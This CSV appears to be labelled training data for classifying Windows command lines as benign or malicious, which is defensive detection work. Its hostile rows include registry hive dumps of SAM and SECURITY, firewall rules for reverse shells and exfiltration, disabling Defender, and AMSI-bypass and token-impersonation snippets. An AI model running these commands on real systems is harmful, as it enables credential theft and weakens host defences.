text,label
reg save hklm\security c:\windows\temp\vlv6jw13.save,1
reg export hklm\system c:\windows\temp\9qz399rp.save,1
rule: exfil data | app: any | dir: outbound | act: allow | port: 1337,2
"powershell -nop -c ""reg save hklm\sam c:\temp\grribmfh.dat""",1
"cmd.exe /c ""select-string  -path  c:\logs\app.log  -pattern  'failed  logon'""",0
reg  export  hklm\security  c:\windows\temp\9ah2st3q.save,1
reg save hklm\security c:\windows\temp\pq0agelw.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\5k40odgl.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vtznwnbt.dat""",1
"cmd.exe /c ""whoami /groups""",0
reg   save   hklm\sam   c:\windows\temp\l3x4syw4.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\88lktenk.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\viaf80yk.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\va1fxiii.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\p5jhnz99.dat""""",1
reg export hklm\sam c:\windows\temp\2mbwysai.save,1
reg export hklm\security c:\windows\temp\ss4xhojr.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\gr6vqbgs.save""",1
reg save hklm\system c:\windows\temp\jnig24jy.save,1
reg save hklm\sam c:\windows\temp\ma2yylnr.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\cai0x0in.dat""",1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"cmd.exe /c ""reg save hklm\sam c:\temp\1f1b0pqa.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ubg45axq.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\iwr8jig3.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\s6g2zay7.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\m10ycnsn.save""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\t86jvdhn.dat""",1
reg export hklm\security c:\windows\temp\kb92vaxz.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\sam c:\windows\temp\2p7v51jb.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dhn1h92e.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u87qxp7t.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ke9gopwg.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\xklppopz.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\24n1fbwa.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\vddnsumh.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\o3598n8r.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\8af9x1fa.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0tk7w2nb.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3evsa3nt.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\d7zgtsp8.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
"powershell -nop -c ""reg export hklm\security c:\temp\g48yob54.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\q8p3v4j8.dat""",1
reg save hklm\security c:\windows\temp\cqumi2es.save,1
reg save hklm\system c:\windows\temp\iax0epkq.save,1
"cmd.exe /c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\sam c:\windows\temp\evx5z085.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\xv2ladoy.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2bjhvkfs.dat""",1
reg save hklm\security c:\windows\temp\vp5hrmzm.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ttj9fdti.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\nsqdmbj6.dat""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\qpu3is8z.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wl6hopj8.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\1ceo2hzt.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hk2bnqzh.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yvlazbsu.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\wqx735uy.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\guzsgdpm.dat""",1
reg  export  hklm\sam  c:\windows\temp\6mjauztx.save,1
reg save hklm\system c:\windows\temp\9d9iu5f2.save,1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"cmd.exe /c ""reg save hklm\sam c:\temp\03auc2qt.dat""",1
reg save hklm\sam c:\windows\temp\aktl3k36.save,1
"cmd.exe /c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)",3
"powershell -nop -c ""reg save hklm\sam c:\temp\d6fhqliu.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\mpq346nq.dat""",1
reg save hklm\security c:\windows\temp\vl7m4ao5.save,1
reg  save  hklm\system  c:\windows\temp\7ox1lm52.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bnzxz0co.dat""",1
reg export hklm\system c:\windows\temp\xip3lf5g.save,1
reg save hklm\sam c:\windows\temp\i8tb84go.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\mj6gak61.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2ijoblw2.dat""",1
reg export hklm\sam c:\windows\temp\ewtm1bc9.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"powershell -nop -c ""reg save hklm\security c:\temp\6z9butbx.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\td4roipr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\13xl4rfg.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\39f54bmq.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\up2fid3w.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\oh1o8f5h.dat""""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\24yqkm2h.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ymeyr19s.dat""",1
reg export hklm\sam c:\windows\temp\szx0fmnw.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\iuz815xt.save""",1
reg save hklm\security c:\windows\temp\pyluaju4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\p8m4j33a.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\w4uoqhxx.dat""",1
reg save hklm\sam c:\windows\temp\adqv5jhg.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\voc0fxgn.dat""",1
reg save hklm\system c:\windows\temp\sjoepgc2.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\fstqojp3.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vqjxsf8a.dat""",1
reg export hklm\system c:\windows\temp\dzzc9jxj.save,1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"cmd.exe /c ""reg save hklm\sam c:\temp\udivipfk.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\uz1dqo6r.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\5yal5v0p.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ei5nrfwp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\3r4bhicw.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dwrd1ga9.dat""",1
reg export hklm\system c:\windows\temp\15pqzxft.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\lou30ru5.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\kzzlyncq.save""",1
reg export hklm\security c:\windows\temp\8u3aytq7.save,1
reg save hklm\security c:\windows\temp\adoezb8z.save,1
reg export hklm\security c:\windows\temp\tug3965u.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\n1yhmaam.save""",1
reg export hklm\security c:\windows\temp\jn0qlfnh.save,1
"cmd.exe /c ""set-mppreference   -disablerealtimemonitoring   $true""",2
reg export hklm\security c:\windows\temp\4nfbk95o.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\91iesv20.dat""",1
reg export hklm\security c:\windows\temp\rskxq427.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\xw2c8y2h.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4tb6kv9a.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\wfy86q5n.dat""""",1
reg save hklm\security c:\windows\temp\s1z0v1kc.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bw4ekvz4.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\n8p26w2o.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\xw9drdgw.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\bhb88n8p.dat""",1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg export hklm\security c:\temp\0liuv4za.dat""",1
reg save hklm\sam c:\windows\temp\u9zvrjl5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\fv2e41tk.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4ezlculm.dat""",1
reg export hklm\security c:\windows\temp\f4scs51f.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\yi3bynew.dat""",1
"cmd.exe /c ""set-mppreference -disablerealtimemonitoring $true""",2
reg save hklm\system c:\windows\temp\et8s2cm9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\053n8ag2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\2wswlz1h.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\7gafj32f.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\ot5vfagk.dat""",1
"powershell -nop -c ""wmic   product   get   name,   version""",0
reg save hklm\sam c:\windows\temp\615rlxib.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7x775ld0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\c6i0vvlw.dat""",1
reg export hklm\sam c:\windows\temp\cchu71lg.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\5yfm0krx.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\epe0ud6i.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\fun87qe3.dat""",1
reg export hklm\sam c:\windows\temp\oylr1770.save,1
reg save hklm\sam c:\windows\temp\r3r15lb6.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\x14z2nsb.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\iod1xx2m.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\6n9vvasc.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\oziumo33.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r5nases3.dat""",1
"[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)",3
reg save hklm\sam c:\windows\temp\hjbijqp9.save,1
reg save hklm\security c:\windows\temp\11b9luuo.save,1
reg save hklm\sam c:\windows\temp\0kw3vpuq.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\d5c4s14l.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\vlrs6pqn.dat""""",1
reg save hklm\security c:\windows\temp\8fkkdj0v.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\oefrymfs.dat""",1
"powershell -nop -c ""backup-utility write hklm\software to c:\backups\config.dat""",0
"cmd.exe /c ""reg export hklm\security c:\temp\sgh71hi0.dat""",1
reg save hklm\security c:\windows\temp\a1rqf0zp.save,1
reg  save  hklm\system  c:\windows\temp\mbh6sn7d.save,1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg save hklm\security c:\temp\uqx59nf1.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\paxpnb0k.dat""",1
reg save hklm\security c:\windows\temp\k2g6zlc0.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\9a8cro3g.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\j9gsfjla.dat""",1
reg save hklm\system c:\windows\temp\lowvch2n.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\u4quzj99.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   openprocesstoken(...)""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\s9yz1jqt.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\i7cx05w8.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\xouxfh83.dat""",1
reg save hklm\security c:\windows\temp\kdfsm2di.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\kjf1v6bk.dat""",1
reg save hklm\sam c:\windows\temp\3vciz4vh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0kc4650u.dat""",1
reg save hklm\system c:\windows\temp\6lvag9od.save,1
reg save hklm\system c:\windows\temp\a022x2xy.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\0l111nb7.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""get-help  adjusttokenprivileges  -full""",0
"powershell -nop -c ""reg save hklm\security c:\temp\cfq5fek1.dat""",1
backup-utility   write   hklm\software   to   c:\backups\config.dat,0
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\zmgz9d4h.dat""",1
reg save hklm\security c:\windows\temp\bn0q9e8z.save,1
reg export hklm\security c:\windows\temp\49i9mlu5.save,1
"cmd.exe /c ""netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444""",2
reg save hklm\system c:\windows\temp\xybboszi.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\iryk91yl.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\njcwqxor.dat""",1
reg export hklm\sam c:\windows\temp\7eh77y82.save,1
reg save hklm\system c:\windows\temp\qmakfndb.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hpjz6x52.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\690ui14p.dat""",1
reg export hklm\sam c:\windows\temp\68lyox13.save,1
reg save hklm\sam c:\windows\temp\apaaenls.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\uaatxn9y.save""",1
reg export hklm\sam c:\windows\temp\yoo1fg8b.save,1
reg   export   hklm\security   c:\windows\temp\xas1puk9.save,1
reg export hklm\security c:\windows\temp\gg1riv2f.save,1
netsh   dump   >   netconfig.txt,0
reg save hklm\sam c:\windows\temp\t4ilxljt.save,1
reg save hklm\system c:\windows\temp\93d3u9dv.save,1
reg export hklm\sam c:\windows\temp\05frbnkj.save,1
reg save hklm\sam c:\windows\temp\5fw7b39g.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\77paf4zt.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\juzs0bvz.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\ufdgy1kr.dat""""",1
reg save hklm\sam c:\windows\temp\omtbiddu.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\security c:\windows\temp\j1yocf9p.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\th014sas.dat""""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\zj1i6zw2.save""",1
"powershell -nop -c ""netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444""",2
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\m6l7xrwy.dat""",1
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"cmd.exe /c ""reg save hklm\security c:\temp\72hpd7y6.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9e9l2v61.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\oijuwn29.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\om3lbafl.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ke0ok4s4.dat""",1
reg export hklm\security c:\windows\temp\oksb2acp.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rbw6z77q.dat""",1
"powershell -nop -c ""node   server.js   --port   3000""",0
"powershell -nop -c ""reg export hklm\security c:\temp\biouzfl1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\5wk08p0n.dat""",1
reg export hklm\sam c:\windows\temp\n1vz7dkd.save,1
reg save hklm\system c:\windows\temp\q3j7tktp.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\jr8wlxgg.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\mzdq0x2o.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\kjq4q8ho.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\sojcgcm1.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hy4iwuwh.dat""",1
reg export hklm\system c:\windows\temp\187a1kdd.save,1
reg  save  hklm\security  c:\windows\temp\fostkw3l.save,1
rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""reg save hklm\sam c:\temp\n19yf2eh.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\kuqwlq4r.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\4pd6tcn8.save""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\ihzujaav.dat""""",1
reg export hklm\sam c:\windows\temp\fkxocsrw.save,1
reg save hklm\sam c:\windows\temp\myilno1s.save,1
reg   export   hklm\sam   c:\windows\temp\2x5jjqbu.save,1
reg export hklm\system c:\windows\temp\ysahqajd.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\4cgwex8h.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\uorzkfwg.dat""",1
reg save hklm\system c:\windows\temp\22k95zcm.save,1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\gpd4xo3e.dat""""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\z47koyae.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\cas9gowk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\kscvfc3x.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\e1v1t2cb.dat""",1
reg export hklm\system c:\windows\temp\vr1wuvnj.save,1
reg export hklm\system c:\windows\temp\kfgw7wfg.save,1
"cmd.exe /c ""token::elevate""",3
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\qkatj8zk.dat""""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\zkll493k.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\5axzzuaa.dat""",1
reg save hklm\sam c:\windows\temp\kcv97aog.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\cuy0yn9b.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\1uhhxgrx.dat""",1
reg save hklm\security c:\windows\temp\swgc5lc4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\9wt0zdnd.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\ki8nj1a8.save""",1
reg save hklm\system c:\windows\temp\n8ny9s67.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ma0mtrjb.dat""",1
reg save hklm\security c:\windows\temp\yx5j7mf4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\z7th0f7q.dat""",1
reg export hklm\sam c:\windows\temp\vhruqmo8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\672nd2zb.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\0zd3kp01.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\zba3pjz3.dat""",1
